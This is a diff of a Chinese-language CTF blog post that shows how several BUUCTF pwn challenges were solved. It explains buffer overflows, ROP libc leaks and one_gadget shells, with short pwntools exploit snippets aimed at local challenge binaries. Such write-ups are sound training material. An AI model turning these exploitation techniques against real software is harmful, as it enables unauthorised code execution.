@@ -20,62 +20,83 @@
     var CONFIG = {"hostname":"river-li.xyz","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":true,"preload":true},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="前一段时间做毕设，平常就没太多时间做别的东西了，现在暂时没有那么忙了 就准备继续学一些pwn和reverse的东西，每天刷上一些题吧 这个文档准备写所有的1分pwn题的wp 由于还没写完，里面的图片还没设置好，网上看应该是看不了的">
+  <meta name="description" content="前一段时间做毕设，平常就没太多时间做别的东西了，现在暂时没有那么忙了 就准备继续学一些pwn和reverse的东西，每天刷上一些题吧 这个文档准备写所有的1分pwn题的wp 由于还没写完，里面的有些图片还没设置好，网上看应该是看不了的">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[buuctf]-pwn1">
 <meta property="og:url" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/index.html">
 <meta property="og:site_name" content="River&#39;s blog">
-<meta property="og:description" content="前一段时间做毕设，平常就没太多时间做别的东西了，现在暂时没有那么忙了 就准备继续学一些pwn和reverse的东西，每天刷上一些题吧 这个文档准备写所有的1分pwn题的wp 由于还没写完，里面的图片还没设置好，网上看应该是看不了的">
+<meta property="og:description" content="前一段时间做毕设，平常就没太多时间做别的东西了，现在暂时没有那么忙了 就准备继续学一些pwn和reverse的东西，每天刷上一些题吧 这个文档准备写所有的1分pwn题的wp 由于还没写完，里面的有些图片还没设置好，网上看应该是看不了的">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200521120905993.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200521121055537.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200521151406290.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200521151712916.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200521151828614.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200521154003798.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200521154215022.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200521160749065.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200521161353701.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200521161302184.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200521161252038.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200521161437093.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200521165649983.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200521203023180.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200521203057408.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200521205842979.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200521213720001.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200521213626806.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200521214208274.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200521215200612.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200521215620358.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200522173556823.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200625064345899.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200625121418899.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200625123543553.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200625123736584.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200625125242661.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200625133907380.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200625194857123.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200730150103790.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200730151448182.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200730154608035.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200730154806723.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200731111433918.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200731120253306.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200731121934216.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200731190353655.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200907171415275.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200907171504354.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200907171852085.png">
-<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200907172756891.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200521120905993.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200521121055537.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200521151406290.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200521151712916.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200521151828614.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200521154003798.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200521154215022.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200521160749065.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200521161353701.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200521161302184.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200521161252038.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200521161437093.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200521165649983.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200521203023180.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200521203057408.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200521205842979.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200521213720001.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200521213626806.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200521214208274.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200521215200612.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200521215620358.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200522173556823.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200625064345899.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200625121418899.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200625123543553.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200625123736584.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200625125242661.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200625133907380.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200625194857123.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200730150103790.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200730151448182.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200730154608035.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200730154806723.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200731111433918.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200731120253306.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200731121934216.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200731190353655.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1/image-20200907171415275.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1/image-20200907171504354.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1/image-20200907171852085.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1/image-20200907172756891.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201101105215030.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201101105611971.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201101105649086.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201101105733721.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201101141818205.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201101142701814.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201101142126563.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201101142037053.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201102162750820.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201102171957552.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201102172023608.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201102172124594.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201102192917583.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201102193648677.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201102193257668.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201102201744573.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201102204244975.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201102204313538.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201102204414050.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201102204442374.png">
+<meta property="og:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20201102204549168.png">
 <meta property="article:published_time" content="2020-05-21T04:07:57.000Z">
-<meta property="article:modified_time" content="2020-09-26T06:47:04.558Z">
+<meta property="article:modified_time" content="2020-11-02T12:56:13.170Z">
 <meta property="article:author" content="River Li">
 <meta property="article:tag" content="hack">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/buuctf-pwn1.assets/image-20200521120905993.png">
+<meta name="twitter:image" content="https://river-li.xyz/2020/05/21/buuctf-pwn1/image-20200521120905993.png">
 
 <link rel="canonical" href="https://river-li.xyz/2020/05/21/buuctf-pwn1/">
 
@@ -274,7 +295,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-09-26 14:47:04" itemprop="dateModified" datetime="2020-09-26T14:47:04+08:00">2020-09-26</time>
+                <time title="修改时间：2020-11-02 20:56:13" itemprop="dateModified" datetime="2020-11-02T20:56:13+08:00">2020-11-02</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -300,14 +321,14 @@
         <p>前一段时间做毕设，平常就没太多时间做别的东西了，现在暂时没有那么忙了</p>
 <p>就准备继续学一些pwn和reverse的东西，每天刷上一些题吧</p>
 <p>这个文档准备写所有的1分pwn题的wp</p>
-<p>由于还没写完，里面的图片还没设置好，网上看应该是看不了的</p>
+<p>由于还没写完，里面的有些图片还没设置好，网上看应该是看不了的</p>
 <a id="more"></a>
 
 <h2 id="RIP"><a href="#RIP" class="headerlink" title="RIP"></a>RIP</h2><p>首先程序拖到IDA看一下代码</p>
-<p><img src="buuctf-pwn1.assets/image-20200521120905993.png"></p>
+<p><img src="image-20200521120905993.png"></p>
 <p><code>main</code>函数的内容就这么短，是一个<code>gets</code>引起的溢出，看到这个<code>char s</code>距离rbp有Fh</p>
 <p>侧边看到还有一个fun函数</p>
-<p><img src="buuctf-pwn1.assets/image-20200521121055537.png"></p>
+<p><img src="image-20200521121055537.png"></p>
 <p>内容直接返回了一个shell</p>
 <p>栈内的数据由近到远依次是局部变量、rbp，最后是返回地址</p>
 <p>应该要覆盖返回地址到fun函数这里，这个值是<code>0x401186</code></p>
@@ -329,15 +350,15 @@
 </blockquote>
 <p>感觉不太对，但是目前还没想明白这个原因是什么</p>
 <h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><p>首先查看一下安全措施</p>
-<p><img src="buuctf-pwn1.assets/image-20200521151406290.png"></p>
+<p><img src="image-20200521151406290.png"></p>
 <p>全都没开，毕竟是一道一分题，应该不会太难</p>
 <p>运行一下的效果，一个输出一个输入然后结束</p>
 <p>拖到IDA里面看一下</p>
-<p><img src="buuctf-pwn1.assets/image-20200521151712916.png"></p>
+<p><img src="image-20200521151712916.png"></p>
 <p>几个输出之后最后调用了一个<code>gets</code>函数</p>
 <p>前面输出的内容中输出了一个函数的地址</p>
 <p>这个函数内容就是<code>cat flag</code></p>
-<p><img src="buuctf-pwn1.assets/image-20200521151828614.png"></p>
+<p><img src="image-20200521151828614.png"></p>
 <p>思路应该是差不多的，先填充v5到rbp的40h个字节</p>
 <p>之后填充rbp，最后覆盖返回地址为WoW函数的地址</p>
 <p>很奇怪的是，在本地运行的时候</p>
@@ -350,60 +371,60 @@
 <p>这样才能得到正确结果</p>
 <p>怀疑是不是本地的虚拟机有点问题，可能是libc版本之类的</p>
 <h2 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h2><p>首先还是查看一下安全机制</p>
-<p><img src="buuctf-pwn1.assets/image-20200521154003798.png"></p>
+<p><img src="image-20200521154003798.png"></p>
 <p>发现开启了NX，栈上禁止执行，但是这些简单的题目一般也用不到</p>
 <p>拖到IDA里面看看</p>
 <p>main函数直接调用了vuln</p>
-<p><img src="buuctf-pwn1.assets/image-20200521154215022.png"></p>
+<p><img src="image-20200521154215022.png"></p>
 <p>vuln里面就是一个printf一个fgets</p>
 <p>中间对gets的输入做了一些处理</p>
-<p><img src="buuctf-pwn1.assets/image-20200521160749065.png"></p>
+<p><img src="image-20200521160749065.png"></p>
 <p>输入中的I会被替换为you</p>
 <p>最后又使用strcpy填充回去s的位置</p>
-<p><img src="buuctf-pwn1.assets/image-20200521161353701.png"></p>
+<p><img src="image-20200521161353701.png"></p>
 <p>对输入本身存在长度限制，多于32长度的内容会被丢弃</p>
-<p><img src="buuctf-pwn1.assets/image-20200521161302184.png"></p>
+<p><img src="image-20200521161302184.png"></p>
 <p>但是这个s数组和ebp相距0x3c，60显然是超过32的</p>
-<p><img src="buuctf-pwn1.assets/image-20200521161252038.png"></p>
+<p><img src="image-20200521161252038.png"></p>
 <p>所以我们需要通过填充I，利用这个转换为you的机制填充中间的内容，最后覆盖返回地址为get_flag</p>
-<p><img src="buuctf-pwn1.assets/image-20200521161437093.png"></p>
+<p><img src="image-20200521161437093.png"></p>
 <p>构造出exp</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn1_sctf_2016&#x27;</span>)</span><br><span class="line">payloads = <span class="string">&#x27;I&#x27;</span>*<span class="number">20</span>+<span class="string">&#x27;A&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x08048F0D</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payloads)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><p>首先检查一下保护机制</p>
-<p><img src="buuctf-pwn1.assets/image-20200521165649983.png"></p>
+<p><img src="image-20200521165649983.png"></p>
 <p>同样只有NX</p>
 <p>main函数中的设置了一个buf，之后调用了另一个func</p>
-<p><img src="buuctf-pwn1.assets/image-20200521203023180.png"></p>
+<p><img src="image-20200521203023180.png"></p>
 <p>这个调用的func很神奇</p>
-<p><img src="buuctf-pwn1.assets/image-20200521203057408.png"></p>
+<p><img src="image-20200521203057408.png"></p>
 <p><code>gets</code>了一个v1</p>
 <p>但是比较的却是v2的值，如果v2满足条件就可以执行</p>
 <p>看到v1距离rbp有30h</p>
 <p>v2距离rbp只有4h，因此首先要填补这之间的差值</p>
 <p>之后加上一个float的值11.28125就可以了</p>
 <p>这里python在计算float值时有点麻烦，不如直接在IDA里比对这个11.28125的二进制值</p>
-<p><img src="buuctf-pwn1.assets/image-20200521205842979.png"></p>
+<p><img src="image-20200521205842979.png"></p>
 <p>exp也比较简单</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./ciscn_2019_n_1&#x27;</span>)</span><br><span class="line">payloads = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x30</span><span class="number">-0x4</span>)+p32(<span class="number">0x41348000</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payloads)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>首先还是看一下安全机制</p>
-<p><img src="buuctf-pwn1.assets/image-20200521213720001.png"></p>
+<p><img src="image-20200521213720001.png"></p>
 <p>是个64位程序，开了NX</p>
 <p>运行的时候是一个加密解密的程序</p>
-<p><img src="buuctf-pwn1.assets/image-20200521213626806.png"></p>
+<p><img src="image-20200521213626806.png"></p>
 <p>选择加密的话可以返回密文，但是选择解密会告诉你让你自己解</p>
 <p>拖到IDA看一看</p>
 <p>main函数代码反编译的挺清晰</p>
-<p><img src="buuctf-pwn1.assets/image-20200521214208274.png"></p>
+<p><img src="image-20200521214208274.png"></p>
 <p>这里在加密时输入的内容比较长的话会出现段错误</p>
-<p><img src="buuctf-pwn1.assets/image-20200521215200612.png"></p>
+<p><img src="image-20200521215200612.png"></p>
 <p>encrypt函数这里s数组在输入时可能会溢出</p>
-<p><img src="buuctf-pwn1.assets/image-20200521215620358.png"></p>
+<p><img src="image-20200521215620358.png"></p>
 <p>但是这次的程序里没有找到之前那几个题目里面那样可以直接得到shell或者是直接读flag的函数</p>
 <p>所以需要ROP的技巧</p>
 <p>查看got和plt表，发现没有exec和system之类的函数，所以不是简单的返回到代码段就可以做出来</p>
@@ -424,7 +445,7 @@
 <p>64位程序传递参数时，如果参数少于7个，会依次放在rdi、rsi、rdx、rcx、r8、r9中</p>
 <p>后面的参数才会放在栈中</p>
 <p>所以首先要获取到的gadget就是能从栈中将数据传入到rdi的</p>
-<p><img src="buuctf-pwn1.assets/image-20200522173556823.png"></p>
+<p><img src="image-20200522173556823.png"></p>
 <p>通过ROPgadget获取到<code>pop rdi</code>的地址</p>
 <p>泄漏puts地址的思路主要是通过rop运行puts函数，同时控制参数使得输出的内容是puts在got表中的真实值，这样就可以输出puts在内存中的实际地址</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payloads = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x58</span> + pop_rdi + puts_got + puts_plt + start</span><br></pre></td></tr></table></figure>
@@ -433,7 +454,7 @@
 <p>但是实际上，构造好了payload之后，在encrypt函数return之前，对数组s进行了一个操作，就是上面逆向代码中循环的部分，好在这个操作不是很难，直接是通过ascii对字符简单的异或，因此我们的payload在发送之前也经过一个对应的解密操作就可以了</p>
 <p>获取到puts的真实地址后就可以计算出实际的libc基地址</p>
 <p>之后利用one_gadget搜索这个给定的libc中存在的<code>execve(&quot;/bin/sh&quot;)</code></p>
-<p><img src="buuctf-pwn1.assets/image-20200625064345899.png" alt="image-20200625064345899"></p>
+<p><img src="image-20200625064345899.png" alt="image-20200625064345899"></p>
 <p>测试之后第二个地址是可以使用的，另外两个都会崩溃</p>
 <p>通过偏移计算出对应的实际地址</p>
 <p>最后再一次执行main函数，溢出到这个位置即可</p>
@@ -442,21 +463,21 @@
 
 
 <h2 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h2><h3 id="基本分析"><a href="#基本分析" class="headerlink" title="基本分析"></a>基本分析</h3><p>首先checksec检查安全机制</p>
-<p><img src="buuctf-pwn1.assets/image-20200625121418899.png" alt="image-20200625121418899"></p>
+<p><img src="image-20200625121418899.png" alt="image-20200625121418899"></p>
 <p>这还是很少见的开启Full RELRO的程序</p>
 <p>拖到ida看一下主函数的逻辑</p>
-<p><img src="buuctf-pwn1.assets/image-20200625123543553.png" alt="image-20200625123543553"></p>
+<p><img src="image-20200625123543553.png" alt="image-20200625123543553"></p>
 <p>这个函数里面没有溢出点，打开了<code>/dev/urandom</code>读出其中4个字节，赋值给<code>buf</code></p>
 <p>之后buf再作为一个函数的参数，得到v2</p>
 <p>最后再将v2作为参数传入一个函数运行，下面看一下这两个函数的逻辑</p>
-<p><img src="buuctf-pwn1.assets/image-20200625123736584.png" alt="image-20200625123736584"></p>
+<p><img src="image-20200625123736584.png" alt="image-20200625123736584"></p>
 <p>这个函数的参数是buf作为int的值，看到下面有一个<code>strncmp</code>的<code>if</code>语句，如果值为不为0就会导致直接exit</p>
 <p>所以这里需要buf和s的值相等，向上倒推</p>
 <p>局部变量buf是在上面<code>read(0,buf,0x20u)</code>从stdin输入的0x20个字节内容</p>
 <p>而s是在<code>sprintf(&amp;s,&quot;%ld&quot;,a1)</code>这里被赋值为<code>a1</code>，即整个函数的参数，main函数中的<code>buf</code></p>
 <p>最终返回的这个v5乍一看不存在赋值的语句，但是实际上看到内存中buf位于<code>ebp-2Ch</code>，v5位于<code>ebp-25h</code>，而且这里read读取的过程允许读最多0x20的长度，因此是可以覆盖v5字节，控制返回值的</p>
 <p>最后看一下上面v2作为参数的函数</p>
-<p><img src="buuctf-pwn1.assets/image-20200625125242661.png" alt="image-20200625125242661"></p>
+<p><img src="image-20200625125242661.png" alt="image-20200625125242661"></p>
 <p>这个函数的输入是上面返回的v5，大小是我们可以控制的</p>
 <p>当这个字节的值是127时，可以从stdin读取长度<code>0xC8</code>的内容，其他值时就可以读取a1长度的内容</p>
 <p>而buf距离ebp有E7h，因此肯定要尽可能的大，这里尽量控制返回值为0xff，必须要求e7h以上才可以</p>
@@ -480,7 +501,7 @@
 <p>这个payload执行完成之后会输出write的真实地址，并且再一次回到程序开始运行的地方</p>
 <p>之后计算出libc的基地址即可</p>
 <h4 id="溢出得到shell"><a href="#溢出得到shell" class="headerlink" title="溢出得到shell"></a>溢出得到shell</h4><p>在得到基地址之后，再一次执行上面的流程，跳到gadget的位置即可</p>
-<p><img src="buuctf-pwn1.assets/image-20200625133907380.png" alt="image-20200625133907380"></p>
+<p><img src="image-20200625133907380.png" alt="image-20200625133907380"></p>
 <p>首先要把控制返回值v5的payload发送一遍，之后的payload应该是下面这样子</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p32(execve_sh)</span><br></pre></td></tr></table></figure>
 
@@ -494,7 +515,7 @@
 
 <p>调用system函数的时候，<code>aaaa</code>是system的返回地址，用来占位</p>
 <h2 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h2><h3 id="基本分析-1"><a href="#基本分析-1" class="headerlink" title="基本分析"></a>基本分析</h3><p>首先checksec检查安全机制</p>
-<p><img src="buuctf-pwn1.assets/image-20200625194857123.png" alt="image-20200625194857123"></p>
+<p><img src="image-20200625194857123.png" alt="image-20200625194857123"></p>
 <p>同样是开启了NX的程序</p>
 <p>可能也是一道ROP的题目</p>
 <p>看了逆向的代码之后发现和<code>ciscn_2019_c_1</code>几乎一样，两道题目唯一的区别就是之前那个题附带给了libc，这个题没有给libc的文件</p>
@@ -502,17 +523,17 @@
 <p>从原本的直接读本地libc，改成利用<code>LibcSearcher</code></p>
 <p>两道题目甚至可以用同一个exp</p>
 <h2 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h2><h3 id="基本分析-2"><a href="#基本分析-2" class="headerlink" title="基本分析"></a>基本分析</h3><p>首先看到main函数</p>
-<p><img src="buuctf-pwn1.assets/image-20200730150103790.png" alt="image-20200730150103790"></p>
+<p><img src="image-20200730150103790.png" alt="image-20200730150103790"></p>
 <p>一个printf一个gets，main函数的逻辑还是挺简单的</p>
 <p>看到旁边的函数，有一个<code>get_flag</code></p>
-<p><img src="buuctf-pwn1.assets/image-20200730151448182.png" alt="image-20200730151448182"></p>
+<p><img src="image-20200730151448182.png" alt="image-20200730151448182"></p>
 <p>这里的<code>get_flag</code>不是简单的直接读文件，还存在两个条件判断，判断了a1、a2两个数的值</p>
 <p>而这两个数是<code>get_flag</code>的参数，也就是说在构造payload的时候需要将a1、a2两个参数的值附上，或者需要直接跳转到这两个条件判断之后的代码</p>
 <p>差点忘了要检查一下安全机制：</p>
